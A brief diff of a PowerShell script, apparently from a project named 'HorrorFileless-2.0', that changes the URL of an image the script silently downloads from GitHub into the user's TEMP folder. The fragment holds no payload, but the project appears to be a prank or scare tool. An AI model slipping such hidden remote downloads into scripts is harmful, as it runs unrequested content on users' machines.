@@ -99,7 +99,7 @@ $keyMap = @{
 $imgPath = "$env:TEMP\$tmpId.tmp"
 if (-not (Test-Path $imgPath)) {
     try {
-        $wr = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/kaylone09/HorrorFileless-2.0/refs/heads/main/test.jpg')
+        $wr = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/kaylone09/HorrorFileless-2.0/refs/heads/main/anime.jpg')
         $wr.Timeout = 5000
         $resp = $wr.GetResponse()
         $stream = $resp.GetResponseStream()
